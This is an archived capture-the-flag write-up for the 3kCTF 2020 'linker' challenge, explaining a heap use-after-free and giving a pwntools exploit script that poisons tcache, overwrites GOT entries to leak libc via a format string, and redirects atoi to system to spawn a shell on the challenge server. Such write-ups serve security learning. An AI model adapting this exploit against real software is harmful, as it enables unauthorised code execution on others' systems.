# linker

**CTF:** 3kCTF 2020  
**Category:** misc  
**Original writeup:** <https://wrecktheline.com/writeups/3kctf-2020/> — by **wrecktheline.com**. All credit goes to the original author; this is an archived copy.

---

Linker - 15 Solves by sqrtrev On function edit , If It has a value on pages[v1] , we can edit pages variable. If you see empty_page , It do free(pages[v1]) and do not initialize with NULL at pages[v1] . So, we can write some value on deleted heap section. There is tcache working. So, I allocated and free seventh for filling tcache bin. (Because we can use fastbin when the tcache bin is full) I modified fd at free chunk for change memcpy part to printf to get FSB for leaking libc and changed atoi address to system address. from pwn import * p = remote('linker.3k.ctf.to', 9654) e = ELF('./linker') def add(size): p.sendlineafter('> ','1') p.sendlineafter('size:',str(size)) def edit(idx,data): p.sendlineafter('> ','2') p.sendlineafter('dex:',str(idx)) p.sendafter('tent:',data) def empty(idx): p.sendlineafter('> ','3') p.sendlineafter('dex:',str(idx)) def re(): p.sendlineafter('> ','4') p.sendlineafter('size:

','5') p.sendafter('name:

','%15$p') for i in range(7): add(0x60) empty(0) add(0x60) add(0x60) add(0x71) empty(0) edit(0,p64(0x6020C0)) add(0x60) add(0x60) edit(3,p64(0xff)*2+p64(0x0)*4+p64(e.got['memcpy'])+p64(e.got['atoi'])) edit(0,p64(e.plt['printf'])) re() p.sendafter('name:

','

') libc = int(p.recvuntil('W')[:-1],16) - 231 - 0x021ab0 system = libc + 0x04f4e0 print hex(libc) edit(1,p64(system)) p.sendline('sh\x00') p.interactive()
